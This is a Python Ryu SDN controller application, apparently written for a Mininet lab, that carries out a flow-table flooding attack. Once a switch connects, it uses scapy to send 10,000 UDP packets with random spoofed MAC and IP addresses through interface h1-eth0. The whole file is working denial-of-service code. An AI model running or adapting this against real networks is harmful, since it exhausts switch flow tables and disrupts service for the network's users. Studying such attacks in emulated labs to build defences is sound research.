from ryu.base import app_manager
from ryu.controller import ofp_event
from ryu.controller.handler import MAIN_DISPATCHER, set_ev_cls
from ryu.ofproto import ofproto_v1_3
from scapy.all import sendp, Ether, IP, UDP
import random

class FlowTableFloodingAttack(app_manager.RyuApp):
    OFP_VERSIONS = [ofproto_v1_3.OFP_VERSION]

    def __init__(self, *args, **kwargs):
        super(FlowTableFloodingAttack, self).__init__(*args, **kwargs)

    @set_ev_cls(ofp_event.EventOFPSwitchFeatures, MAIN_DISPATCHER)
    def switch_features_handler(self, ev):
        self.logger.info("Iniciando ataque de inundación de flujos")
        self.flood_flow_table()

    def flood_flow_table(self):
        self.logger.info("Comenzando a enviar paquetes...")
        for i in range(10000):  # Enviar 10,000 paquetes con diferentes direcciones IP
            random_mac_src = self.random_mac()
            random_mac_dst = self.random_mac()
            random_ip_src = self.random_ip()
            random_ip_dst = self.random_ip()

            pkt = Ether(src=random_mac_src, dst=random_mac_dst) / \
                  IP(src=random_ip_src, dst=random_ip_dst) / \
                  UDP(sport=12345, dport=80)

            # Imprimir el paquete que se está enviando
            self.logger.info(f"Enviando paquete: {pkt.summary()}")

            sendp(pkt, iface="h1-eth0", verbose=False)  # Enviar por la interfaz de Mininet

    def random_mac(self):
        mac = [0x00, 0x16, 0x3e,
               random.randint(0x00, 0x7f),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff)]
        return ':'.join(map(lambda x: "%02x" % x, mac))

    def random_ip(self):
        return "10.0.%d.%d" % (random.randint(1, 254), random.randint(1, 254))
